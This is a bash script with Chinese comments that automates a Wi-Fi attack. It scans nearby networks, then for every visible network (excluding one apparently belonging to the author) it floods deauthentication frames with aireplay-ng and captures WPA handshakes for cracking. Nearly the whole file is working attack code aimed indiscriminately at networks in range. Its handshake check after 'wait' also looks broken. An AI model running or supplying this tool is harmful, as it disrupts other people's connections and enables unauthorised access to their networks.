#!/bin/bash

# 使用 airodump-ng 扫描无线网络并保存到文件
# 保存的文件名格式为 wifi_list_YYYYMMDD_HHMM.csv

# 获取当前时间
TIMESTAMP=$(date +"%Y%m%d_%H%M")

mkdir -p wifi
cd wifi
rm -rf *

# 创建存放握手包的目录
HANDSHAKE_DIR="../handshakes"
mkdir -p $HANDSHAKE_DIR

# 输出文件名
OUTPUT_FILE="wifi_list_${TIMESTAMP}.csv"

# 检查是否有 root 权限
if [ "$EUID" -ne 0 ]; then
  echo "请以 root 权限运行此脚本。"
  exit 1
fi

# 扫描 WiFi 并保存结果
echo "正在扫描 WiFi 网络，请稍等..."
airodump-ng wlan0mon -w wifi_list --output-format csv &

# 运行 airodump-ng 一段时间（例如 10 秒）
SLEEP_DURATION=10
sleep $SLEEP_DURATION

# 终止 airodump-ng
AIRODUMP_PID=$(pgrep -f "airodump-ng wlan0mon")
kill $AIRODUMP_PID

# 将结果重命名为带有时间戳的文件
mv wifi_list-01.csv "$OUTPUT_FILE"

# 输出结果文件名
echo "WiFi 列表已保存到文件: $OUTPUT_FILE"

# 读取 WiFi 列表并提取 BSSID 和频道信息，去掉 ESSID 为空的行（隐藏网络）
BSSIDS=($(awk -F',' 'NR>1 && $1 ~ /[0-9A-Fa-f:]{17}/ && $14 != "" && $14 !~ /ireoo\.com/ {print $1}' "$OUTPUT_FILE" | tr -d '\r' | tr -s ' '))
CHANNELS=($(awk -F',' 'NR>1 && $1 ~ /[0-9A-Fa-f:]{17}/ && $14 != "" && $14 !~ /ireoo\.com/ {print $4}' "$OUTPUT_FILE" | tr -d '\r' | tr -s ' '))
ESSIDS=($(awk -F',' 'NR>1 && $1 ~ /[0-9A-Fa-f:]{17}/ && $14 != "" && $14 !~ /ireoo\.com/ {print $14}' "$OUTPUT_FILE" | tr -d '\r' | tr -s ' '))

# 循环获取握手包
for ((i=0; i<${#BSSIDS[@]}; i++)); do
  BSSID=${BSSIDS[$i]}
  CHANNEL=${CHANNELS[$i]}
  ESSID=${ESSIDS[$i]}
  echo "正在获取 $ESSID[$BSSID] 的握手包，频道 $CHANNEL..."

  # 启动 airodump-ng，并通过管道将输出传递给 grep 进行实时查找
  airodump-ng -c $CHANNEL --bssid $BSSID -w $ESSID wlan0mon | grep -m 1 "WPA handshake" &
  
  # 获取后台进程的 PID
  AIRODUMP_PID=$!

  # 使用 aireplay-ng 发送去认证请求以加快握手包获取
  echo "正在使用 aireplay-ng 对 BSSID 为 $BSSID 发送去认证请求..."
  aireplay-ng -0 100 -a $BSSID wlan0mon &

  AIREPLAY_PID=$(pgrep -f "aireplay-ng -0 100 -a $BSSID wlan0mon")

  # 等待 airodump-ng 和 grep 执行完毕
  wait $AIRODUMP_PID

  kill $AIREPLAY_PID

  # 获取管道中各命令的退出状态
  AIRODUMP_EXIT_STATUS=${PIPESTATUS[0]}  # airodump-ng 的退出状态
  GREP_EXIT_STATUS=${PIPESTATUS[1]}     # grep 的退出状态

  # 判断是否找到了握手包
  if [ $GREP_EXIT_STATUS -eq 0 ]; then
    echo "找到 WPA 握手包，继续处理..."
    # 复制握手包到指定目录
    cp -rf $ESSID-*.cap $HANDSHAKE_DIR/
  else
    echo "没有找到 WPA 握手包，或者发生了错误。"
  fi

done

echo "所有 BSSID 的握手包获取和破解过程已完成。"
